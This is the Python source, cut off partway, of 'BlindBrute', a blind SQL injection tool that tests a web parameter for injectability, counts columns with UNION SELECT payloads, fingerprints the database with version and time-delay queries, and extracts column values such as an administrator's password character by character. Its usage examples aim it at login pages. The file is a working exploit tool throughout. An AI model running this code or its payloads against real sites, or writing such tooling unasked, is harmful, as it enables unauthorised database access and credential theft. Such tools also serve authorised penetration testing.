import os
import sys
import time
import json
import msvcrt
import string
import select
import requests
import argparse
import platform
import statistics
from copy import deepcopy
from urllib.parse import quote
from gramification import gramify
from concurrent.futures import ThreadPoolExecutor, as_completed


### Constants and Usage


def usage():
    usage = """
    BlindBrute - Blind SQL Injection Brute Forcer

    Usage:
        python blindbrute.py -u <URL> -t <TABLE> -c <COLUMN> -w <WHERE CLAUSE> [options]

    Required Arguments:
        -u, --url                    Target URL
        -t, --table                  Table name from which to extract the data
        -c, --column                 Column name to extract (e.g., Password)
        -w, --where                  WHERE clause (e.g., Username = 'Administrator')

    Optional Arguments:
        -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
        -sh, --static-headers        Static headers as key-value pairs that do not contain payloads
        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
        -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
        -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
        -o, --output-file            Specify a file to output the extracted data
        -ba, --binary-attack         Use binary search for ASCII extraction. HIGHLY recommended if character case matters.
        -da, --dictionary-attack     Path to a wordlist for dictionary-based extraction
        -db, --database              Specify the database type (e.g., MySQL, PostgreSQL)
        --level                      Specify the threading level
        --delay                      Delay in seconds between requests to bypass rate limiting
        --timeout                    Timeout for each request in seconds (default: 10)
        --verbose                    Enable verbose output for debugging
        --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
        --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
        --sleep-only                 Use sleep-based detection methods strictly. Accepts whole numbers as sleep times. Sleep time must be >= 1.
        --force                      Skip the injectability check and force a detection method (status, content, keyword, or sleep)
        --gramify                    Generate n-grams and probabilities from the provided file path")
        --top-n                      Number of top results to display and save for n-grams. Less is often more here.


    Examples:
        blindbrute.py -u "http://example.com/login" -d "username=sam&password=" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
        blindbrute.py -u "http://example.com/login" -f request.txt -t users -c password -w "username='admin'" --binary-attack
        blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'" --force status
    """
    print(usage)


def load_request(file_path):
    try:
        with open(file_path, 'r') as f:
            file_content = f.read()
        return parse_request(file_content)
    except Exception as e:
        print(f"[-] Error reading request file: {e}")
        return None, None, None


def load_grams(grams_file_path):
    try:
        with open(grams_file_path, 'r') as file:
            grams = json.load(file)
        return grams
    except Exception as e:
        print(f"Error loading {grams_file_path}: {e}")
        return None


def load_queries():
    queries_file = os.path.join(os.path.dirname(__file__), 'queries.json')
    sleep_file = os.path.join(os.path.dirname(__file__), 'sleep.json')

    try:
        with open(queries_file, 'r') as file:
            queries = json.load(file)
    except Exception as e:
        print(f"Error loading version queries: {e}")
        queries = {}

    try:
        with open(sleep_file, 'r') as file:
            sl_queries = json.load(file)
    except Exception as e:
        print(f"Error loading sleep queries: {e}")
        sl_queries = {}

    return {"queries": queries, "sl_queries": sl_queries}


def max_workers(args):
    try:
        num_cpus = os.cpu_count()
        level = args.level
        workers = num_cpus * level
        return workers

    except Exception as e:
        print(f"[-] Error determining max workers: {e}. Defaulting to 8.")
        return 8


### Objects


class RequestInfo:
    def __init__(self, url, timeout, injectable_headers=None, static_headers=None, request_template=None, data=None):
        self.url = url
        self.timeout = timeout
        self.injectable_headers = injectable_headers or {}
        self.static_headers = static_headers or {}
        self.request_template = request_template or {}
        self.data = data


class DatabaseInfo:
    def __init__(self, injectable, baseline_condition, method, conditions, threshold_type, avg_variance, columns, db_name,
                 db_specific, substring_query, sleep_query, length_query, length):
        self.injectable = injectable
        self.baseline_condition = baseline_condition
        self.method = method
        self.conditions = conditions
        self.threshold_type = threshold_type
        self.avg_variance = avg_variance
        self.columns = columns
        self.db_name = db_name
        self.db_specific = db_specific
        self.substring_query = substring_query
        self.sleep_query = sleep_query
        self.length_query = length_query
        self.length = length


class BaselineInfo:
    def __init__(self, response, status_code, content_length):
        self.response = response
        self.status_code = status_code
        self.content_length = content_length


class ConstantsInfo:
    def __init__(self, queries, sleep_queries, workers, grams):
        self.queries = queries
        self.sleep_queries = sleep_queries
        self.workers = workers
        self.grams = grams


class PayloadInfo:
    def __init__(self, payload, encoded, conditions):
        self.payload = payload
        self.encoded = encoded
        self.conditions = conditions


### Main Logic


def is_injectable(request_info, constants, args):
    """
    checks if the field is injectable using true, false, and error conditions. also determines the detection method.
    additionally, uses baseline requests to validate against false positives and determine the most accurate detection method.
    """
    if not (args.sleep_only or args.force):
        print("[*] Checking if the field is injectable...")
    else:
        print("[*] Gathering condition info...")

    # Step 1: Baseline request
    baseline = BaselineInfo(
        response = None,
        status_code=None,
        content_length=None
    )
    try:
        baseline.response, baseline.status_code, baseline.content_length = baseline_request(
            request_info=request_info, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return False, None, None, None, constants

    payloads = {
        "true": "' AND '1'='1",
        "false": "' AND '1'='2",
        "error": "' AND"
    }

    responses = {
        "true": {"status_code": None, "content": None},
        "false": {"status_code": None, "content": None},
        "error": {"status_code": None, "content": None}
    }

    handling = {"status": None, "content": None, "keyword": None}
    conditions = {"status": {}, "content": {}, "keyword": {}}
    scores = {"status": 0, "content": 0, "keyword": 0}
    if args.keywords:
        words = args.keywords if args.keywords else []
        keywords = {}

    # Step 2: Test conditions
    for condition, pl in payloads.items():
        payload = PayloadInfo(payload=pl, encoded=quote(pl), conditions=[condition])

        try:
            response, response_time = inject(
                payload=payload,
                request_info=request_info,
                args=args
            )

            if response is None:
                return False, None, None, None, constants

            responses[condition]["status_code"] = response.status_code
            responses[condition]["content-length"] = len(response.text)
            conditions["status"][condition] = response.status_code
            conditions["content"][condition] = len(response.text)

            if args.keywords:
                matching_keywords = [word for word in words if word in response.text]
                keywords[condition] = matching_keywords if matching_keywords else False
                conditions["keyword"][condition] = matching_keywords if matching_keywords else False


        except requests.exceptions.RequestException as e:
            print(f"[-] Error during {condition} condition injection request: {e}")
            return False, None, None, None, constants

    true_status_code = responses["true"]["status_code"]
    false_status_code = responses["false"]["status_code"]
    error_status_code = responses["error"]["status_code"]
    true_content_length = responses["true"]["content-length"]
    false_content_length = responses["false"]["content-length"]
    error_content_length = responses["error"]["content-length"]

    # Step 3: Status code check
    if baseline.status_code == 200:
        if true_status_code == 200 and false_status_code != 200 and error_status_code not in [200, false_status_code]:
            if not args.sleep_only:
                print("[+] Status code detection (full).")
            scores["status"] += 3
            handling["status"] = "true, false, error"
        elif true_status_code == 200 and false_status_code == 200 and error_status_code != 200:
            if not args.sleep_only:
                print("[+] Status code detection (error-only).")
            scores["status"] += 2
            handling["status"] = "error"
        elif true_status_code == 200 and false_status_code == error_status_code:
            if not args.sleep_only:
                print("[-] Field may be injectable, but status codes will not provide accurate data.")
        else:
            if not args.sleep_only:
                print("[-] Field may be injectable, but status codes will not provide accurate data.")
    else:
        if not args.sleep_only:
            print("[-] Malformed request, look over your input.")
        return False, None, None, None, constants

    # Step 4: Content length check
    if (
            diff(true_content_length, false_content_length) and
            diff(true_content_length, error_content_length) and
            diff(false_content_length, error_content_length)
    ):
        if not args.sleep_only:
            print("[+] Content length detection (full).")
        scores["content"] += 2.5
        handling["content"] = "true, false, error"
    elif not diff(true_content_length, false_content_length) and diff(false_content_length, error_content_length):
        if not args.sleep_only:
            print("[+] Content length detection (error-only).")
        scores["content"] += 1.5
        handling["content"] = "false, error"
    elif not diff(true_content_length, false_content_length) and not diff(false_content_length, error_content_length):
        if not args.sleep_only:
            print("[-] Field may be injectable, but content length will not provide accurate data.")
    else:
        if not args.sleep_only:
            print("[-] Field may be injectable, but content length will not provide accurate data.")

    # Step 5: Keyword check
    if args.keywords:
        keyword_occurrences = {}
        for cond, found_keywords in keywords.items():
            if found_keywords:
                for keyword in found_keywords:
                    if keyword not in keyword_occurrences:
                        keyword_occurrences[keyword] = set()
                    keyword_occurrences[keyword].add(cond)

        delete = [keyword for keyword, conds in keyword_occurrences.items() if len(conds) != 1]

        for keyword in delete:
            keyword_occurrences.pop(keyword, None)
            for cond in keywords:
                if keywords[cond] and keyword in keywords[cond]:
                    keywords[cond].remove(keyword)

        only_true = only_false = only_error = False

        for conds in keyword_occurrences.values():
            if conds == {"true"}:
                only_true = True
            elif conds == {"false"}:
                only_false = True
            elif conds == {"error"}:
                only_error = True

        if only_true and only_false and only_error:
            scores["keyword"] += 3
            handling["keyword"] = "true, false, error"
            if not args.sleep_only:
                print("[+] Keyword detection (full)")
        elif only_false and only_error:
            scores["keyword"] += 2
            handling["keyword"] = "false, error"
            if not args.sleep_only:
                print("[+] Keyword detection (false, error)")
        elif only_error and only_true:
            scores["keyword"] += 1
            handling["keyword"] = "true, error"
            if not args.sleep_only:
                print("[+] Keyword detection (true, error)")
        elif only_error:
            scores["keyword"] += 1
            handling["keyword"] = "error"
            if not args.sleep_only:
                print("[+] Keyword detection (error only)")

    smallest_content_diff = float("inf")
    baseline_condition = None

    for condition, data in responses.items():
        if responses[condition]["status_code"] == baseline.status_code:
            content_diff = abs(baseline.content_length - responses[condition]["content-length"])
            if content_diff < smallest_content_diff:
                smallest_content_diff = content_diff
                baseline_condition = condition

    if baseline_condition != "true":
        print("[!] Baseline condition does not evaluate to true. Check the information you supplied. "
              "Make sure the database is receiving a known value.")
        return False, None, None, None, constants

    best_method = max(scores, key=scores.get)
    if scores[best_method] > 0:
        info = handling[best_method].split(", ")
        method = str(best_method)
        if not args.sleep_only:
            print(f"[+] Using {method}-based detection with conditions: {info}.")
        if args.force:
            return conditions, baseline_condition
        if args.sleep_only:
            method = "sleep"
            return True, baseline_condition, method, conditions, constants
        else:
            return True, baseline_condition, method, conditions, constants
    else:
        print("[*] Fastest methods failed. Attempting sleep-based detection.")
        args.sleep_only = 10
        args.timeout += args.sleep_only
        sleep_queries = constants.sleep_queries.get("sleep_queries", [])
        if args.verbose:
            print(f"[VERBOSE] Using sleep detection with {len(sleep_queries)} unique sleep queries.")
        for sleep_query in sleep_queries:
            sleep_query = sleep_query.replace('%', str(args.sleep_only))
            new_payload = f"' AND {sleep_query} AND '1'='1"
            payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=["true"])
            if args.delay > 0:
                if args.verbose:
                    print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                time.sleep(args.delay)

            try:
                response, response_time = inject(
                    payload=payload,
                    request_info=request_info,
                    args=args
                )

                if response is None:
                    return False, None, None, None, constants

                if response_time > args.sleep_only:
                    constants.sleep_queries["sleep_queries"] = [sleep_query.replace(str(args.sleep_only), '%')]
                    break


            except requests.exceptions.RequestException as e:
                print(f"[-] Error during sleep injection request: {e}")
                return False, None, None, None, constants

        if len(constants.sleep_queries["sleep_queries"]) == 1:
            print(f"[+] Sleep query found: {constants.sleep_queries["sleep_queries"]}. Using sleep-based detection.")
            method = "sleep"
            return True, baseline_condition, method, conditions, constants

    print("[-] No significant differences detected between conditions. Field is likely not injectable.")
    return False, None, None, None, constants


def column_count(request_info, db_info, constants, args):
    """
    utilizes UNION SELECT statements and NULL values to match the column output of the original sql query.
    """

    #return 2

    print("[*] Attempting to count columns...")

    # Step 1: Baseline request
    baseline = BaselineInfo(
        response = None,
        status_code=None,
        content_length=None
    )
    try:
        baseline.response, baseline.status_code, baseline.content_length = baseline_request(
            request_info=request_info, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return

    # Step 2: Prepare queries
    sleep_queries = constants.sleep_queries.get("sleep_queries", [])
    tasks = []
    columns_found = False
    columns = 0

    with ThreadPoolExecutor(max_workers=constants.workers) as executor:
        while not columns_found:
            if args.sleep_only:
                for sleep_query in sleep_queries:
                    if not sleep_query or sleep_query == "N/A":
                        print(f"[-] Invalid or unavailable sleep query. Skipping...")
                        continue
                    db_info.sleep_query = sleep_query
                    sleep_query = sleep_query.replace('%', str(args.sleep_only))
                    new_payload = f"' AND {sleep_query} UNION SELECT {','.join(['NULL'] * columns)}{',' if columns > 0 else ""}'1'='1"
                    payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                    if args.delay > 0:
                        if args.verbose:
                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                        time.sleep(args.delay)

                    tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info,
                                                         baseline=baseline, args=args, constants=constants))
            else:
                new_payload = f"' UNION SELECT {','.join(['NULL'] * columns)}{',' if columns > 0 else ""}'1'='1"
                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(
                    executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info,
                                            baseline=baseline, args=args, constants=constants))

            # Step 3: Wait for results
            for future in as_completed(tasks):
                result = future.result()
                if result is True or (isinstance(result, tuple) and result[0] is True):
                    columns += 1
                    print(f"[+] Found {columns} columns")
                    return columns

            columns += 1

    print(f"[-] Unable to detect the column count.")
    return None


def detect_database(request_info, db_info, constants, args):
    """
    attempts to determine the exact database. detection happens in two stages because
    of the way the json is structured. in the case that the version query is used for
    multiple databases, a second batch of requests is sent to determine a more specific
    database. if using sleep detection, that order is reversed. a successful sleep query
    will lead to a version query to narrow down the database. this is not foolproof.
    many of the databases that use the same version queries also use the same sleep queries.
    the first positive ID will be the defacto database. this isn't actually that big of
    a deal because if a database uses identical version queries and sleep queries, the length
    queries and substring queries are typically also identical. just don't quote me on the
    database. my goal is to extract data, not provide you with the database.
    good enough is good enough.
    """

    print("[*] Attempting to detect the database type...")

    adjusted_columns = db_info.columns - 2

    # Step 1: Baseline request
    baseline = BaselineInfo(
        response = None,
        status_code=None,
        content_length=None
    )
    try:
        baseline.response, baseline.status_code, baseline.content_length = baseline_request(
            request_info=request_info, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None, args

    # Step 2: Sleep-only detection
    tasks = []
    if args.sleep_only:
        sleep_queries = constants.sleep_queries.get("sleep_queries", [])
        if args.verbose:
            print(f"[VERBOSE] Using sleep detection with {len(sleep_queries)} unique sleep queries.")
        with ThreadPoolExecutor(max_workers=constants.workers) as executor:
            for sleep_query in sleep_queries:
                db_info_copy = deepcopy(db_info)
                db_info_copy.sleep_query = sleep_query
                sleep_query = sleep_query.replace('%', str(args.sleep_only))
                new_payload = f"' AND {sleep_query} AND '1'='1"
                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
                                            baseline=baseline, constants=constants, args=args))

            # Step 3: Wait for sleep query results
            for future in as_completed(tasks):
                result = future.result()
                if result and result[0] is True:
                    sleep_query = result[1]
                    db_info.sleep_query = sleep_query.replace(str(args.sleep_only), '%')
                    print(f"[+] Sleep-based detection with query {sleep_query}")
                    # Step 4: Lower sleep time
                    new_sleep = lower(
                        request_info=request_info, db_info=db_info,
                        baseline=baseline, constants=constants, args=args
                    )

                    sleep_query = sleep_query.replace(str(args.sleep_only), str(new_sleep))
                    args.sleep_only = new_sleep
                    # Step 5: Check version queries
                    print(f"[*] Checking associated version queries")
                    version_tasks = []
                    with ThreadPoolExecutor(max_workers=constants.workers) as version_executor:
                        for db_name, queries in constants.queries.items():
                            db_info.db_name = db_name
                            sleep_function = constants.queries[db_name].get("sleep_query", None)
                            if isinstance(sleep_function, dict):
                                sleep_queries = sleep_function.items()
                            else:
                                sleep_queries = [(None, sleep_function)]
                            for db_specific, query in sleep_queries:
                                db_info_copy = deepcopy(db_info)
                                db_info_copy.db_specific = db_specific
                                db_info_copy.sleep_query = query
                                query = query.replace('%', str(args.sleep_only))
                                sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                if query == sleep_query:
                                    version_query = queries.get("version_query")
                                else:
                                    continue
                                if version_query:
                                    new_payload = (f"' AND {query} UNION {version_query}{',' if adjusted_columns != 0 else ''}"
                                                   f"{','.join(['NULL'] * adjusted_columns)},'1'='1")
                                    payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                                    if args.delay > 0:
                                        if args.verbose:
                                            print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                                        time.sleep(args.delay)

                                version_tasks.append(
                                    version_executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
                                                                    baseline=baseline, constants=constants, args=args))

                        # Step 6: Wait for results from version query detection
                        for version_future in as_completed(version_tasks):
                            result = version_future.result()
                            if result:
                                db_info = result
                                print(f"[+] Database confirmed: {db_info.db_specific if db_info.db_specific else db_info.db_name}")
                                db_info.sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                return db_info, args

                    print(f"[-] No database confirmed with version queries.")
                    return None, args

    else:
        # Step 7: Standard detection
        tasks = []
        with ThreadPoolExecutor(max_workers=constants.workers) as executor:
            for db_name, info in constants.queries.items():
                db_info_copy = deepcopy(db_info)
                db_info_copy.db_name = db_name
                db_query = info.get("version_query")
                new_payload = (f"' UNION {db_query}{',' if adjusted_columns != 0 else ''}"
                               f"{','.join(['NULL'] * adjusted_columns)},'1'='1")
                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                    time.sleep(5)

                tasks.append(executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
                                                     baseline=baseline, constants=constants, args=args))

            # Step 8: Wait for standard detection results
            for future in as_completed(tasks):
                result = future.result()
                if result is not None:
                    db_info = result
                    print(f"[+] Database detected: {db_info.db_name}")
                    sleep_function = constants.queries[db_info.db_name].get("sleep_query", None)
                    # Step 9: Narrow down the database if needed
                    if isinstance(sleep_function, dict):
                        print(f"[*] Narrowing down to the specific database version...")
                        args.sleep_only = 10
                        args.timeout += args.sleep_only
                        specific_tasks = []
                        with ThreadPoolExecutor(max_workers=constants.workers) as specific_executor:
                            for db_specific, sleep_query in sleep_function.items():
                                db_info_copy = deepcopy(db_info)
                                db_info_copy.db_specific = db_specific
                                db_info_copy.sleep_query = sleep_query
                                if not sleep_query or sleep_query == "N/A":
                                    print(
                                        f"[-] Sleep function for {db_info_copy.db_specific} is not applicable or not found. Skipping...")
                                    continue
                                sleep_query = sleep_query.replace('%', str(args.sleep_only))
                                new_payload = f"' AND {sleep_query} AND '1'='1"
                                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "error"])
                                if args.delay > 0:
                                    if args.verbose:
                                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                                    time.sleep(args.delay)

                                specific_tasks.append(
                                    specific_executor.submit(detect, payload=payload, request_info=request_info, db_info=db_info_copy,
                                                                     baseline=baseline, constants=constants, args=args))

                            # Step 10: Wait for more specific results
                            for specific_future in as_completed(specific_tasks):
                                specific_result = specific_future.result()
                                if specific_result is not None:
                                    args.sleep_only = None
                                    db_info = specific_result
                                    print(f"[+] Narrowed down to specific database: {db_info.db_specific}")
                                    return db_info, args
                    else:
                        db_info.sleep_query = sleep_function
                        return db_info, args

    print(f"[-] Unable to detect the database type. Exiting.")
    return None, args


def discover_length(request_info, db_info, args):
    """
    determines the length of the data using binary search.
    returns the length of the data if found, otherwise None.
    """

    #return 17

    if not db_info.length_query or db_info.length_query == "N/A":
        print(f"[-] Length query not found for {db_info.db_name}. Skipping data length detection.")
        return None

    print(f"[*] Attempting to discover the length of the data for {args.table}.{args.column} using {db_info.length_query}...")

    # Step 1: Baseline request for status and content length
    try:
        baseline = BaselineInfo(*baseline_request(request_info=request_info, args=args))
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return None

    low, high = 1, args.max_length
    length_info = {'length': None, 'high': high}

    # Step 2: Binary search for data length
    while low <= length_info['high']:
        mid = (low + length_info['high']) // 2
        if args.sleep_only and db_info.sleep_query:
            sleep_query = db_info.sleep_query.replace('%', str(args.sleep_only))
            new_payload = f"' AND {sleep_query} AND {db_info.length_query}((SELECT {args.column} FROM {args.table} WHERE {args.where}))<='{mid}"
        else:
            new_payload = f"' AND {db_info.length_query}((SELECT {args.column} FROM {args.table} WHERE {args.where}))<='{mid}"

        payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "false"])

        if args.delay > 0:
            if args.verbose:
                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
            time.sleep(args.delay)

        try:
            response, response_time = inject(payload=payload, request_info=request_info, args=args)
            if response is None:
                return None

            # Step 3: Check conditions
            result = check_conditions(
                response, response_time, payload, db_info, baseline, args,
                on_match=lambda: binary_match(mid, length_info)
            )
            if result is None:
                low = mid + 1

        except requests.exceptions.RequestException as e:
            print(f"[-] Error during length discovery: {e}")
            return None

    # Step 4: Return
    if length_info['length']:
        length = length_info['length']
        print(f"[+] Data length discovered: {length}")
        return length
    else:
        print(f"[-] Failed to discover data length within the maximum length {args.max_length}.")
        return None


def extract_data(request_info, db_info, constants, args):
    """
    extracts data in a variety of ways. the default behavior is a threaded charcter-by-character
    approach with a standard set of letter frequencies and ngrams.if that doesnt tickle your fancy,
    you can provide a dictionary, use a binary search algorithm, or provide a more tailored piece
    of sample text for custom ngrams. the world is your oyster.
    """

    print("[*] Attempting to extract data...")

    extracted_data = ""
    wordlist = None
    position = 1

    if args.dictionary_attack:
        try:
            with open(args.dictionary_attack, 'r') as wordlist_file:
                wordlist = [line.strip() for line in wordlist_file.readlines()]
            if args.verbose:
                print(f"[VERBOSE] Loaded {len(wordlist)} lines from dictionary file.")
        except Exception as e:
            print(f"[-] Error loading wordlist: {e}")
            return None

    # Step 1: Baseline request
    baseline = BaselineInfo(
        response = None,
        status_code=None,
        content_length=None
    )
    try:
        baseline.response, baseline.status_code, baseline.content_length = baseline_request(
            request_info=request_info, args=args
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Error during baseline request: {e}")
        return

    # Binary search override (not threaded)
    if args.binary_attack:
        while position <= db_info.length:
            low, high = 32, 126
            found_match = False

            prioritized_chars = prioritize_characters(extracted_data, grams=constants.grams, position=position, length=db_info.length)
            check_exact = True

            if prioritized_chars:
                mid = ord(prioritized_chars[0])
            else:
                mid = (low + high) // 2

            while low <= high:
                if check_exact:
                    operator = "="
                    check_exact = False
                else:
                    operator = ">"

                if args.sleep_only:
                    new_payload = (f"' AND {db_info.sleep_query} AND ASCII({db_info.substring_query}((SELECT {args.column} "
                                   f"FROM {args.table} WHERE {args.where}), {position}, 1)){operator}'{mid}")
                else:
                    new_payload = (f"' AND ASCII({db_info.substring_query}((SELECT {args.column} FROM {args.table} "
                                   f"WHERE {args.where}), {position}, 1)){operator}'{mid}")

                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "false"])

                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                    time.sleep(args.delay)

                result = extract(
                    payload=payload, request_info=request_info,
                    db_info=db_info, value=chr(mid), args=args,
                    baseline=baseline
                )

                if result and operator == "=":
                    extracted_data += chr(mid)
                    print(f"[+] Value found {chr(mid)} at position {position}")
                    found_match = True
                    position += 1
                    break
                elif result and operator == ">":
                    low = mid + 1
                elif operator == ">":
                    high = mid - 1

                mid = (low + high) // 2

            if 32 <= low <= 126 and not found_match:
                extracted_data += chr(low)
                print(f"[+] Value found {chr(low)} at position {position}")
                found_match = True
                position += 1

            if not found_match:
                print(f"[*] No match found at position {position}. Stopping extraction.")
                break

    # Step 2: Iterate over possible values
    while position <= db_info.length:
        found_match = False
        fallback_to_char = False
        if wordlist and position > (2 * db_info.length // 3):
            fallback_to_char = one_third()

        possible_values = wordlist if wordlist and not fallback_to_char else (
            prioritize_characters(grams=constants.grams, extracted_chars=extracted_data,
                                  position=position, length=db_info.length)
        )

        with ThreadPoolExecutor(max_workers=constants.workers) as executor:
            tasks = []
            for value in possible_values:
                if wordlist and len(value) > (db_info.length - position + 1):
                    continue

                if args.sleep_only:
                    new_payload = (f"' AND {db_info.sleep_query} AND {db_info.substring_query}((SELECT {args.column} "
                                   f"FROM {args.table} WHERE {args.where}), {position}, {len(value)})='{value}")
                else:
                    new_payload = (f"' AND {db_info.substring_query}((SELECT {args.column} FROM {args.table} "
                                   f"WHERE {args.where}), {position}, {len(value)})='{value}")

                payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload),
                                      conditions=[db_info.baseline_condition, "false"])
                if args.delay > 0:
                    if args.verbose:
                        print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                    time.sleep(args.delay)

                tasks.append(executor.submit(extract, payload=payload, value=value, request_info=request_info,
                                                      db_info=db_info, baseline=baseline, args=args))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    extracted_data += result
                    print(f"[+] Value found {result} at position {position}")
                    position += len(result)
                    found_match = True
                    break

        if not found_match:
            if wordlist:
                if spent():
                    print(f"[*] Extracting single character at position {position} using binary search.")
                    low, high = 32, 126
                    found_match = False

                    prioritized_chars = prioritize_characters(extracted_chars=extracted_data, grams=constants.grams,
                                                              position=position, length=db_info.length)
                    check_exact = True

                    if prioritized_chars:
                        mid = ord(prioritized_chars[0])
                    else:
                        mid = (low + high) // 2

                    while low <= high:
                        if check_exact:
                            operator = "="
                            check_exact = False
                        else:
                            operator = ">"

                        if args.sleep_only:
                            new_payload = (f"' AND {db_info.sleep_query} AND ASCII({db_info.substring_query}((SELECT {args.column}"
                                           f" FROM {args.table} WHERE {args.where}), {position}, 1)){operator}'{mid}")
                        else:
                            new_payload = (f"' AND ASCII({db_info.substring_query}((SELECT {args.column} FROM {args.table} "
                                           f"WHERE {args.where}), {position}, 1)){operator}'{mid}")

                        payload = PayloadInfo(payload=new_payload, encoded=quote(new_payload), conditions=[db_info.baseline_condition, "false"])

                        if args.delay > 0:
                            if args.verbose:
                                print(f"[VERBOSE] Delaying for {args.delay} seconds...")
                            time.sleep(args.delay)

                        result = extract(
                            payload=payload, request_info=request_info, db_info=db_info,
                            baseline=baseline, value=chr(mid), args=args
                        )

                        if result and operator == "=":
                            extracted_data += chr(mid)
                            print(f"Exact match found: {chr(mid)} at position {position}")
                            found_match = True
                            position += 1
                            break
                        elif result and operator == ">":
                            low = mid + 1
                        elif operator == ">":
                            high = mid - 1

                        mid = (low + high) // 2

                    if 32 <= low <= 126:
                        extracted_data += chr(low)
                        print(f"[+] Value found {chr(low)} at position {position}")
                        found_match = True
                        position += 1
                        continue
                    else:
                        print(f"[*] No valid match found at position {position}. Stopping extraction.")
                        break

            else:
                print(f"[*] No match found at position {position}. Stopping extraction.")
                break

    return extracted_data


### Prompts


def no_length():
    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
          end='', flush=True)

    if platform.system() == "Windows":
        start_time = time.time()
        while True:
            if (time.time() - start_time) > 10:
                print("\n[*] No input received. Proceeding with extraction anyway.")
                return True
            if msvcrt.kbhit():
                user_input = input().strip().lower()
                return user_input == 'y'
    else:
        i, _, _ = select.select([sys.stdin], [], [], 60)
        if i:
            user_input = sys.stdin.readline().strip().lower()
            return user_input == 'y'
        else:
            print("\n[*] No input received. Proceeding with extraction anyway.")
            return True


def one_third():
    print(
        "\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
    print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)

    if platform.system() == "Windows":
        start_time = time.time()
        while True:
            if (time.time() - start_time) > 10:
                print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
                return True
            if msvcrt.kbhit():
                user_input = input().strip().lower()
                if user_input == 'y':
                    return True
                elif user_input == 'n':
                    return False
    else:
        i, _, _ = select.select([sys.stdin], [], [], 60)
        if i:
            user_input = sys.stdin.readline().strip().lower()
            if user_input == 'y':
                return True
            elif user_input == 'n':
                return False
        else:
            print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
            return True


def spent():
    print(
        "\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ",
        end='', flush=True)

    if platform.system() == "Windows":
        start_time = time.time()
        while True:
            if (time.time() - start_time) > 10:
                print("\n[*] No input received. Proceeding with character extraction automatically.")
                return True
            if msvcrt.kbhit():
                user_input = input().strip().lower()
                if user_input == 'y':
                    return True
                elif user_input == 'n':
                    return False
    else:
        i, _, _ = select.select([sys.stdin], [], [], 60)
        if i:
            user_input = sys.stdin.readline().strip().lower()
            if user_input == 'y':
                return True
            elif user_input == 'n':
                return False
        else:
            print("\n[*] No input received. Proceeding with character extraction automatically.")
            return True


### Helper Functions <3


def parse_request(file_content):
    """
    parses the request file and returns packaged data to be ingested by the requests library
    """

    lines = file_content.splitlines()

    if not lines:
        raise ValueError("The file is empty.. why are you like this?")

    request_line = lines[0].strip()
    headers = {}
    body = ""
    is_body = False

    for line in lines[1:]:
        line = line.strip()

        if not line and not is_body:
            is_body = True
            continue

        if is_body:
            body += line + "\n" if line else ""
        else:
            if ': ' in line:
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            else:
                raise ValueError(f"Invalid header format: {line}")

    body = body.rstrip("\n")

    return request_line, headers, body


def prioritize_characters(extracted_chars, grams, position, length):
    """
    prioritizes characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
    handles first and last characters of the data to be extracted as special cases.
